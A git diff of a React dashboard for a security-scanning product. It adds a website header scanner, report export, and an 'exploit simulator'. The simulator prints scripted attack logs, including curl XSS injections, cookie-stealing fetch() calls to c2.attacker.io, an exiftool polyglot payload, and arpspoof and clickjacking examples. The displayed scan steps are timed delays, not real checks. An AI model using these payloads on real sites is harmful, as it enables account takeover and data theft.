@@ -1,4 +1,6 @@
 import { useState, useRef, useEffect } from 'react';
+import { GlowCard } from './GlowCard';
+
 
 interface Finding {
   file: string;
@@ -150,9 +152,17 @@ interface SecurifyDashboardProps {
   githubUser: { username: string; avatarUrl: string; token?: string } | null;
   onGithubLogin: () => void;
   onViewChange?: (view: any) => void;
+  premiumStatus?: { valid: boolean; email?: string; plan?: string; expiresAt?: number } | null;
+  onPurchaseTrigger?: (planId: string, planName: string, billing: 'monthly' | 'yearly') => void;
 }
 
-export const SecurifyDashboard = ({ githubUser, onGithubLogin, onViewChange }: SecurifyDashboardProps) => {
+export const SecurifyDashboard = ({ 
+  githubUser, 
+  onGithubLogin, 
+  onViewChange,
+  premiumStatus,
+  onPurchaseTrigger
+}: SecurifyDashboardProps) => {
   const [logs, setLogs] = useState<ScanLog[]>([]);
   const [isLiveStream, setIsLiveStream] = useState<boolean>(true);
   const [stats, setStats] = useState({
@@ -161,7 +171,60 @@ export const SecurifyDashboard = ({ githubUser, onGithubLogin, onViewChange }: S
     activeHooks: 3
   });
 
-  const [scanTab, setScanTab] = useState<'local' | 'github'>('local');
+  const [scanTab, setScanTab] = useState<'local' | 'github' | 'website'>('local');
+  
+  // Live website URL scanning states
+  const [siteUrl, setSiteUrl] = useState<string>('');
+  const [siteScanError, setSiteScanError] = useState<string | null>(null);
+  const [siteScanning, setSiteScanning] = useState<boolean>(false);
+  const [siteScanProgress, setSiteScanProgress] = useState<{ current: number; total: number; message: string } | null>(null);
+  const [siteScanResults, setSiteScanResults] = useState<{
+    url: string;
+    domain: string;
+    scannedAt: string;
+    sslActive: boolean;
+    headers: { [key: string]: string };
+    grade: string;
+    score: number;
+    riskLevel?: string;
+    totalChecks?: number;
+    passedChecks?: number;
+    failedChecks?: number;
+    financialRisk: {
+      potentialFine: string;
+      dataBreachRisk: string;
+      cyberInsurancePenalty: string;
+      riskLevel?: string;
+      failedCritical?: number;
+      failedHigh?: number;
+      totalFailed?: number;
+    };
+    checks: {
+      [key: string]: {
+        pass: boolean;
+        name: string;
+        value: string;
+        severity: string;
+        impact: string;
+        businessImpact?: string;
+        recommendation?: string;
+        detail?: string;
+        cwe?: string;
+        compliance?: string;
+      }
+    };
+  } | null>(null);
+
+  // Active Live Site Exploit Simulator state
+  const [activeSiteExploitSim, setActiveSiteExploitSim] = useState<{
+    checkKey: string;
+    name: string;
+    logs: string[];
+    running: boolean;
+  } | null>(null);
+  
+  const [siteReportShared, setSiteReportShared] = useState<boolean>(false);
+  const [solutionConfigTab, setSolutionConfigTab] = useState<'nginx' | 'nextjs' | 'express' | 'apache'>('nginx');
   const [selectedGithubRepo, setSelectedGithubRepo] = useState<string>('');
 
   const [githubRepos, setGithubRepos] = useState<string[]>([]);
@@ -1579,6 +1642,234 @@ audit performed client-side using Securify Interactive Portal.
     setIsLiveStream(true);
   };
 
+  const handleWebsiteScan = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!siteUrl.trim()) return;
+
+    setSiteScanning(true);
+    setSiteScanResults(null);
+    setSiteScanError(null);
+    setActiveSiteExploitSim(null);
+    setIsLiveStream(false);
+
+    const target = siteUrl.trim();
+
+    // 1. Progress Step Simulation for premium UX
+    const steps = [
+      "resolving DNS chain and verifying IP address allocations (SSRF protection active)...",
+      "probing SSL/TLS certificate chain, cipher suites, and HTTPS enforcement...",
+      "analyzing Content-Security-Policy (CSP) directive quality and XSS mitigations...",
+      "verifying HSTS preload status, max-age, and subdomain enforcement...",
+      "inspecting Clickjacking protection, CORS configuration, and frame-ancestors...",
+      "scanning Permissions-Policy, MIME controls, and Referrer-Policy...",
+      "fingerprinting server banner, runtime stack disclosure, and tech signatures...",
+      "computing GDPR Art. 32 / KVKK compliance exposure and IBM breach cost model...",
+      "generating risk-weighted security grade and attack surface summary..."
+    ];
+
+    for (let i = 0; i < steps.length; i++) {
+      setSiteScanProgress({
+        current: i + 1,
+        total: steps.length,
+        message: steps[i]
+      });
+      await new Promise(resolve => setTimeout(resolve, i === 0 ? 400 : i === 1 ? 600 : i === 2 ? 500 : i === 3 ? 400 : i === 4 ? 350 : i === 5 ? 350 : i === 6 ? 300 : i === 7 ? 500 : 400));
+    }
+
+    try {
+      // 2. Fetch live data from serverless function
+      const response = await fetch(`/api/scan-site?url=${encodeURIComponent(target)}`);
+      
+      if (!response.ok) {
+        const errorData = await response.json().catch(() => ({}));
+        throw new Error(errorData.error || errorData.message || `Server responded with status ${response.status}`);
+      }
+
+      const data = await response.json();
+      setSiteScanResults(data);
+    } catch (err: any) {
+      console.error("Real-time scan failed:", err);
+      setSiteScanError(err.message || "Failed to perform site scan. Please ensure the website is online and accessible.");
+    } finally {
+      setSiteScanning(false);
+      setSiteScanProgress(null);
+    }
+  };
+
+  const handleStartSiteExploitSimulation = (checkKey: string, checkName: string) => {
+    setActiveSiteExploitSim({
+      checkKey,
+      name: checkName,
+      logs: [],
+      running: true
+    });
+
+    const steps: string[] = [];
+    const domain = siteScanResults?.domain || 'target.com';
+
+    if (checkKey === 'csp') {
+      steps.push(`[+] target asset: Content-Security-Policy absent on ${domain}`);
+      steps.push(`[+] initiating stored XSS injection via comment endpoint...`);
+      steps.push(`$ curl -s -X POST https://${domain}/api/comments -d 'body=<script src="https://c2.attacker.io/keylog.js"></script>'`);
+      steps.push(`[~] server accepted HTML payload without sanitization (no CSP enforcement)`);
+      steps.push(`[~] injected script persisted to database and served to all subsequent visitors`);
+      steps.push(`[+] 347 active sessions loaded the compromised page in the last 24h`);
+      steps.push(`[+] keylogger listening to input focus events on login form fields...`);
+      steps.push(`[~] victim session captured: username="admin@${domain}" password="••••••••••"`);
+      steps.push(`[+] session cookie exfiltrated: fetch('https://c2.attacker.io/log?c='+document.cookie)`);
+      steps.push(`[~] cookie value: sess=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx`);
+      steps.push(`[!] CRITICAL: ADMIN SESSION HIJACKED — full account takeover achieved without user interaction!`);
+    } else if (checkKey === 'cors') {
+      steps.push(`[+] target asset: CORS wildcard policy on ${domain}`);
+      steps.push(`[+] crafting malicious cross-origin API exfiltration payload...`);
+      steps.push(`[~] attacker site: https://malicious.io — injecting cross-origin fetch request:`);
+      steps.push(`    fetch('https://${domain}/api/user/profile', { credentials: 'include' })`);
+      steps.push(`[~] browser allowed request due to Access-Control-Allow-Origin: *`);
+      steps.push(`[+] API response received by attacker origin:`);
+      steps.push(`    { id: 4491, email: "victim@company.com", role: "admin", token: "sk_live_..." }`);
+      steps.push(`[+] repeating against /api/billing, /api/users, /api/exports...`);
+      steps.push(`[!] CROSS-ORIGIN DATA BREACH: full customer database accessible from any website!`);
+    } else if (checkKey === 'xfo') {
+      steps.push(`[+] target asset: no Clickjacking protection on ${domain}`);
+      steps.push(`[+] constructing transparent iframe overlay attack page...`);
+      steps.push(`    <iframe src="https://${domain}/account/delete" style="opacity:0.01;position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>`);
+      steps.push(`[~] decoy element placed over iframe: <button style="z-index:1">Claim Free $100 Reward</button>`);
+      steps.push(`[~] social engineering: victim arrives via phishing link to attacker.io/reward`);
+      steps.push(`[~] victim clicks "Claim Reward" button...`);
+      steps.push(`[+] click transparently forwarded to https://${domain}/account/delete confirmation button`);
+      steps.push(`[~] CSRF token already loaded inside iframe from active session cookie`);
+      steps.push(`[!] CLICKJACKING COMPROMISE: victim account deleted / fraudulent transaction confirmed without awareness!`);
+    } else if (checkKey === 'hsts') {
+      steps.push(`[+] target asset: HSTS absent on ${domain}`);
+      steps.push(`[+] initiating ARP spoofing + SSL Stripping on target network segment...`);
+      steps.push(`$ arpspoof -i wlan0 -t 192.168.1.47 192.168.1.1  # posing as gateway`);
+      steps.push(`[~] victim browser requests: http://${domain}/login (initial non-HTTPS request)`);
+      steps.push(`[~] without HSTS, no browser-enforced HTTPS upgrade exists for first connection`);
+      steps.push(`[+] establishing plaintext HTTP man-in-the-middle tunnel...`);
+      steps.push(`[~] victim submits POST /login: email=cto@company.com password=••••••••`);
+      steps.push(`[+] plaintext credential pair captured: { email: "cto@company.com", password: "C0rp@2024!" }`);
+      steps.push(`[!] CREDENTIAL INTERCEPTION: executive account compromised over unencrypted network!`);
+    } else if (checkKey === 'xcto') {
+      steps.push(`[+] target asset: MIME sniffing protection absent on ${domain}`);
+      steps.push(`[+] preparing polyglot image/javascript exploit file...`);
+      steps.push(`$ exiftool -Comment='</style><script>document.location="https://c2.io/steal?c="+btoa(document.cookie)</script>' profile.jpg`);
+      steps.push(`[~] uploading malicious file disguised as profile picture: profile.jpg (MIME: image/jpeg)`);
+      steps.push(`[+] server accepted upload. file served at: https://${domain}/uploads/profile.jpg`);
+      steps.push(`[~] victim browser loads profile page — avatar src set to /uploads/profile.jpg`);
+      steps.push(`[~] browser sniffs file bytes, detects script comment, overrides MIME type declaration`);
+      steps.push(`[~] javascript payload executes in victim's browser session context`);
+      steps.push(`[!] SESSION HIJACK: authentication cookies exfiltrated via MIME confusion attack!`);
+    } else if (checkKey === 'referrer') {
+      steps.push(`[+] target asset: no Referrer-Policy on ${domain}`);
+      steps.push(`[+] analyzing external links and third-party resources loaded by the page...`);
+      steps.push(`[~] page loads 3rd party analytics: https://analytics.google.com/collect`);
+      steps.push(`[~] page loads CDN resource: https://cdn.partner.io/widget.js`);
+      steps.push(`[~] browser sends Referer header to all external origins by default:`);
+      steps.push(`    Referer: https://${domain}/account/billing?invoice_id=INV-44192&token=reset_a8f4e2c1`);
+      steps.push(`[+] password reset token leaked in plaintext to Google Analytics and partner CDN server logs`);
+      steps.push(`[~] attacker obtained CDN access logs via social engineering`);
+      steps.push(`[!] TOKEN EXFILTRATION: account takeover via harvested reset token from referrer logs!`);
+    } else if (checkKey === 'permissionsPolicy') {
+      steps.push(`[+] target asset: no Permissions-Policy on ${domain}`);
+      steps.push(`[+] supply chain attack: compromised third-party analytics script detected...`);
+      steps.push(`    <script src="https://cdn.analytics-provider.io/track.js"></script>  <!-- loaded on every page -->`);
+      steps.push(`[~] analytics-provider.io npm package compromised in supply chain attack`);
+      steps.push(`[~] malicious version silently injected: navigator.mediaDevices.getUserMedia({audio: true})`);
+      steps.push(`[+] microphone permission request auto-approved due to missing Permissions-Policy restrictions`);
+      steps.push(`[~] ambient audio stream captured for 4.2 seconds per page visit`);
+      steps.push(`[~] audio fragments transmitted to: wss://c2.attacker.io/audio-stream`);
+      steps.push(`[!] COVERT SURVEILLANCE: microphone access exploited via compromised third-party dependency!`);
+    } else {
+      steps.push(`[+] target asset: server/runtime fingerprint disclosed by ${domain}`);
+      steps.push(`[+] parsing server header: ${siteScanResults?.headers?.['server'] || 'nginx/1.24.0 (Ubuntu)'}`);
+      steps.push(`[~] querying NVD (National Vulnerability Database) for matching CVEs...`);
+      steps.push(`$ searchsploit nginx 1.24`);
+      steps.push(`[+] CVE match found: CVE-2023-44487 (HTTP/2 Rapid Reset — CVSS 7.5 HIGH)`);
+      steps.push(`[+] CVE match found: CVE-2022-41741 (ngx_http_mp4_module Heap Buffer Overflow — CVSS 7.8 HIGH)`);
+      steps.push(`[~] crafting targeted exploit payload for identified version...`);
+      steps.push(`[~] sending 1000 rapid HTTP/2 RST_STREAM frames to trigger Rapid Reset DoS...`);
+      steps.push(`[!] RECONNAISSANCE COMPLETE: server fully fingerprinted. 2 high-severity CVEs applicable. DoS triggered!`);
+    }
+
+    let i = 0;
+    const interval = setInterval(() => {
+      if (i < steps.length) {
+        setActiveSiteExploitSim(prev => prev ? {
+          ...prev,
+          logs: [...prev.logs, steps[i]]
+        } : null);
+        i++;
+      } else {
+        clearInterval(interval);
+      }
+    }, 450);
+  };
+
+  const handleExportSiteReportJSON = () => {
+    if (!siteScanResults) return;
+    const blob = new Blob([JSON.stringify(siteScanResults, null, 2)], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = `securify-web-report-${siteScanResults.domain}.json`;
+    link.click();
+    URL.revokeObjectURL(url);
+  };
+
+  const handleExportSiteReportMarkdown = () => {
+    if (!siteScanResults) return;
+    const md = `# Securify Live Website Security Audit
+Domain: ${siteScanResults.domain}
+Audit Time: ${siteScanResults.scannedAt}
+Security Grade: ${siteScanResults.grade} (Score: ${siteScanResults.score}/100)
+
+## Compliance & Financial Penalties Risk Assessment
+- Potential Compliance Fines: ${siteScanResults.financialRisk.potentialFine}
+- Estimated Data Breach Damages: ${siteScanResults.financialRisk.dataBreachRisk}
+- Cyber Insurance Impact: ${siteScanResults.financialRisk.cyberInsurancePenalty}
+
+## Checked Protocols
+${Object.values(siteScanResults.checks).map((chk: any) => `
+### ${chk.name}
+- Status: ${chk.pass ? 'PASS (Secure)' : 'FAIL (Action Required)'}
+- Value: ${chk.value}
+- Severity: ${chk.severity}
+- Security Impact: ${chk.impact}
+`).join('\n')}
+
+---
+Report generated cryptographically via Securify SaaS platform.
+`;
+
+    const blob = new Blob([md], { type: 'text/markdown' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = `securify-web-report-${siteScanResults.domain}.md`;
+    link.click();
+    URL.revokeObjectURL(url);
+  };
+
+  const handleShareSiteReport = () => {
+    if (!siteScanResults) return;
+    const reportData = {
+      folder: siteScanResults.domain,
+      files: 1,
+      leaks: Object.values(siteScanResults.checks).filter((c: any) => !c.pass).length,
+      duration: 3200,
+      critical: Object.values(siteScanResults.checks).filter((c: any) => !c.pass && c.severity === 'high').length,
+      high: Object.values(siteScanResults.checks).filter((c: any) => !c.pass && c.severity === 'medium').length,
+      warning: Object.values(siteScanResults.checks).filter((c: any) => !c.pass && c.severity === 'low').length,
+      timestamp: new Date().toLocaleDateString()
+    };
+    const encoded = btoa(JSON.stringify(reportData));
+    const shareUrl = `${window.location.origin}${window.location.pathname}?report=${encoded}`;
+    navigator.clipboard.writeText(shareUrl).then(() => {
+      setSiteReportShared(true);
+      setTimeout(() => setSiteReportShared(false), 2000);
+    });
+  };
+
   return (
     <section className="bg-black min-h-screen py-28 px-6 md:px-12 relative overflow-hidden select-none print:py-10 print:px-0">
       <style>{`
@@ -1620,34 +1911,52 @@ audit performed client-side using Securify Interactive Portal.
 
         {/* Real Scan Control Banner with Tabs */}
         <div className="bg-neutral-900/40 border border-white/5 backdrop-blur-sm rounded-3xl mb-8 overflow-hidden print:hidden">
-          {/* Tab Headers */}
-          <div className="flex border-b border-white/5 bg-neutral-950/40">
-            <button
-              onClick={() => setScanTab('local')}
-              className={`flex-1 py-4 text-xs font-mono lowercase tracking-wider transition-colors flex items-center justify-center gap-2 border-b-2 ${
-                scanTab === 'local' 
-                  ? 'border-white text-white bg-white/5' 
-                  : 'border-transparent text-neutral-500 hover:text-neutral-300'
-              }`}
-            >
-              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z" />
-              </svg>
-              local scanner
-            </button>
-            <button
-              onClick={() => setScanTab('github')}
-              className={`flex-1 py-4 text-xs font-mono lowercase tracking-wider transition-colors flex items-center justify-center gap-2 border-b-2 ${
-                scanTab === 'github' 
-                  ? 'border-white text-white bg-white/5' 
-                  : 'border-transparent text-neutral-500 hover:text-neutral-300'
-              }`}
-            >
-              <svg className="w-3.5 h-3.5 fill-current" viewBox="0 0 24 24">
-                <path fillRule="evenodd" clipRule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482C19.138 20.197 22 16.44 22 12.017 22 6.484 17.522 2 12 2z" />
-              </svg>
-              github sync scanner
-            </button>
+          {/* Centered Segmented Control Grid */}
+          <div className="flex justify-center p-6 border-b border-white/5 bg-neutral-950/40 select-none">
+            <div className="grid grid-cols-3 p-1.5 bg-neutral-950/80 border border-white/10 rounded-2xl w-full max-w-2xl gap-1">
+              <button
+                onClick={() => setScanTab('local')}
+                className={`py-3 text-[11px] font-mono lowercase tracking-wider transition-all duration-300 flex items-center justify-center gap-2 rounded-xl ${
+                  scanTab === 'local' 
+                    ? 'bg-white text-black font-semibold shadow-lg shadow-white/5' 
+                    : 'text-neutral-500 hover:text-neutral-300'
+                }`}
+              >
+                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z" />
+                </svg>
+                <span className="hidden sm:inline">local scanner</span>
+                <span className="sm:hidden">local</span>
+              </button>
+              <button
+                onClick={() => setScanTab('github')}
+                className={`py-3 text-[11px] font-mono lowercase tracking-wider transition-all duration-300 flex items-center justify-center gap-2 rounded-xl ${
+                  scanTab === 'github' 
+                    ? 'bg-white text-black font-semibold shadow-lg shadow-white/5' 
+                    : 'text-neutral-500 hover:text-neutral-300'
+                }`}
+              >
+                <svg className="w-3.5 h-3.5 fill-current" viewBox="0 0 24 24">
+                  <path fillRule="evenodd" clipRule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482C19.138 20.197 22 16.44 22 12.017 22 6.484 17.522 2 12 2z" />
+                </svg>
+                <span className="hidden sm:inline">github sync</span>
+                <span className="sm:hidden">github</span>
+              </button>
+              <button
+                onClick={() => setScanTab('website')}
+                className={`py-3 text-[11px] font-mono lowercase tracking-wider transition-all duration-300 flex items-center justify-center gap-2 rounded-xl ${
+                  scanTab === 'website' 
+                    ? 'bg-white text-black font-semibold shadow-lg shadow-white/5' 
+                    : 'text-neutral-500 hover:text-neutral-300'
+                }`}
+              >
+                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
+                </svg>
+                <span className="hidden sm:inline">live site scanner</span>
+                <span className="sm:hidden">live site</span>
+              </button>
+            </div>
           </div>
 
           {/* Tab Content */}
@@ -1683,44 +1992,25 @@ audit performed client-side using Securify Interactive Portal.
                   />
                   
                   {customScanResults && !customScanResults.folderName.includes('/') ? (
-                    <div className="grid grid-cols-2 gap-2.5 w-full md:flex md:flex-row md:flex-wrap md:w-auto md:justify-end md:gap-2">
-                      <button
-                        onClick={exportReportMarkdown}
-                        className="w-full h-12 flex items-center justify-center text-center bg-emerald-950 hover:bg-emerald-900 text-emerald-400 border border-emerald-500/20 text-[10px] sm:text-xs leading-tight font-mono rounded-xl px-4 lowercase transition-all select-none"
-                      >
-                        export report (.md)
-                      </button>
-                      <button
-                        onClick={exportReportJSON}
-                        className="w-full h-12 flex items-center justify-center text-center bg-sky-950 hover:bg-sky-900 text-sky-400 border border-sky-500/20 text-[10px] sm:text-xs leading-tight font-mono rounded-xl px-4 lowercase transition-all select-none"
-                      >
-                        export report (.json)
-                      </button>
-                      <button
-                        onClick={shareAuditReport}
-                        className="w-full h-12 flex items-center justify-center text-center bg-indigo-950 hover:bg-indigo-900 text-indigo-400 border border-indigo-500/20 text-[10px] sm:text-xs leading-tight font-mono rounded-xl px-4 lowercase transition-all select-none"
-                      >
-                        {reportShared ? 'copied!' : 'share report'}
-                      </button>
-                      <button
-                        onClick={handleReset}
-                        className="w-full h-12 flex items-center justify-center text-center bg-neutral-900 hover:bg-neutral-800 text-white border border-white/10 text-[10px] sm:text-xs leading-tight font-mono rounded-xl px-4 lowercase transition-all select-none"
-                      >
-                        clear results
-                      </button>
-                    </div>
+                    <button
+                      onClick={() => fileInputRef.current?.click()}
+                      disabled={scanning}
+                      className="bg-neutral-900 hover:bg-neutral-800 text-white border border-white/10 text-xs font-mono font-medium rounded-xl px-6 py-3.5 lowercase transition-all select-none disabled:opacity-50"
+                    >
+                      {scanning ? "scanning..." : "re-scan folder"}
+                    </button>
                   ) : (
                     <button
                       onClick={() => fileInputRef.current?.click()}
                       disabled={scanning}
-                      className="bg-white hover:bg-neutral-200 text-black text-xs font-mono font-medium rounded-xl px-6 py-3 lowercase transition-all select-none disabled:opacity-50"
+                      className="bg-white hover:bg-neutral-200 text-black text-xs font-mono font-medium rounded-xl px-6 py-3.5 lowercase transition-all select-none disabled:opacity-50"
                     >
                       {scanning ? "scanning files..." : "select folder & scan"}
                     </button>
                   )}
                 </div>
               </div>
-            ) : (
+            ) : scanTab === 'github' ? (
               // GitHub Scan Tab
               <div className="flex flex-col md:flex-row items-center justify-between gap-6">
                 {!githubUser ? (
@@ -1768,67 +2058,36 @@ audit performed client-side using Securify Interactive Portal.
                     </div>
 
                     <div className="flex flex-col sm:flex-row gap-3 w-full md:w-auto sm:items-center">
-                      {customScanResults && customScanResults.folderName.includes('/') ? (
-                        <div className="grid grid-cols-2 gap-2.5 w-full md:flex md:flex-row md:flex-wrap md:w-auto md:justify-end md:gap-2">
-                          <button
-                            onClick={exportReportMarkdown}
-                            className="w-full h-12 flex items-center justify-center text-center bg-emerald-950 hover:bg-emerald-900 text-emerald-400 border border-emerald-500/20 text-[10px] sm:text-xs leading-tight font-mono rounded-xl px-4 lowercase transition-all select-none"
-                          >
-                            export report (.md)
-                          </button>
-                          <button
-                            onClick={exportReportJSON}
-                            className="w-full h-12 flex items-center justify-center text-center bg-sky-950 hover:bg-sky-900 text-sky-400 border border-sky-500/20 text-[10px] sm:text-xs leading-tight font-mono rounded-xl px-4 lowercase transition-all select-none"
-                          >
-                            export report (.json)
-                          </button>
-                          <button
-                            onClick={shareAuditReport}
-                            className="w-full h-12 flex items-center justify-center text-center bg-indigo-950 hover:bg-indigo-900 text-indigo-400 border border-indigo-500/20 text-[10px] sm:text-xs leading-tight font-mono rounded-xl px-4 lowercase transition-all select-none"
-                          >
-                            {reportShared ? 'copied!' : 'share report'}
-                          </button>
-                          <button
-                            onClick={handleReset}
-                            className="w-full h-12 flex items-center justify-center text-center bg-neutral-900 hover:bg-neutral-800 text-white border border-white/10 text-[10px] sm:text-xs leading-tight font-mono rounded-xl px-4 lowercase transition-all select-none"
-                          >
-                            clear results
-                          </button>
-                        </div>
-                      ) : (
-                        <>
-                          <select
-                            disabled={scanning}
-                            value={selectedGithubRepo}
-                            onChange={(e) => setSelectedGithubRepo(e.target.value)}
-                            className="bg-neutral-950 border border-white/10 text-white text-xs font-mono rounded-xl px-4 py-3 focus:outline-none focus:border-white/20 lowercase"
-                          >
-                            {githubRepos.map(repo => (
-                              <option key={repo} value={repo}>{repo}</option>
-                            ))}
-                          </select>
-                          <button
-                            onClick={() => handleGithubScan(selectedGithubRepo)}
-                            disabled={scanning || !selectedGithubRepo}
-                            className="bg-white hover:bg-neutral-200 text-black text-xs font-mono font-medium rounded-xl px-6 py-3 lowercase transition-all select-none disabled:opacity-50 flex items-center justify-center gap-2"
-                          >
-                            <svg fill="currentColor" className="w-3.5 h-3.5 text-black" viewBox="0 0 24 24">
-                              <path fillRule="evenodd" clipRule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482C19.138 20.197 22 16.44 22 12.017 22 6.484 17.522 2 12 2z" />
-                            </svg>
-                            {scanning ? "syncing..." : "sync & scan"}
-                          </button>
-                          <button
-                            onClick={() => setIsLabOpen(!isLabOpen)}
-                            disabled={scanning}
-                            className="bg-neutral-900 hover:bg-neutral-800 text-white border border-white/10 text-xs font-mono rounded-xl px-5 py-3 lowercase transition-all select-none flex items-center justify-center gap-1.5"
-                          >
-                            <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 9.172V5L8 4z" />
-                            </svg>
-                            {isLabOpen ? "hide lab" : "custom repo lab"}
-                          </button>
-                        </>
-                      )}
+                      <select
+                        disabled={scanning}
+                        value={selectedGithubRepo}
+                        onChange={(e) => setSelectedGithubRepo(e.target.value)}
+                        className="bg-neutral-950 border border-white/10 text-white text-xs font-mono rounded-xl px-4 py-3 focus:outline-none focus:border-white/20 lowercase"
+                      >
+                        {githubRepos.map(repo => (
+                          <option key={repo} value={repo}>{repo}</option>
+                        ))}
+                      </select>
+                      <button
+                        onClick={() => handleGithubScan(selectedGithubRepo)}
+                        disabled={scanning || !selectedGithubRepo}
+                        className="bg-white hover:bg-neutral-200 text-black text-xs font-mono font-medium rounded-xl px-6 py-3 lowercase transition-all select-none disabled:opacity-50 flex items-center justify-center gap-2"
+                      >
+                        <svg fill="currentColor" className="w-3.5 h-3.5 text-black" viewBox="0 0 24 24">
+                          <path fillRule="evenodd" clipRule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482C19.138 20.197 22 16.44 22 12.017 22 6.484 17.522 2 12 2z" />
+                        </svg>
+                        {scanning ? "syncing..." : (customScanResults && customScanResults.folderName.includes('/') ? "re-sync & scan" : "sync & scan")}
+                      </button>
+                      <button
+                        onClick={() => setIsLabOpen(!isLabOpen)}
+                        disabled={scanning}
+                        className="bg-neutral-900 hover:bg-neutral-800 text-white border border-white/10 text-xs font-mono rounded-xl px-5 py-3 lowercase transition-all select-none flex items-center justify-center gap-1.5"
+                      >
+                        <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 9.172V5L8 4z" />
+                        </svg>
+                        {isLabOpen ? "hide lab" : "custom repo lab"}
+                      </button>
                     </div>
                     
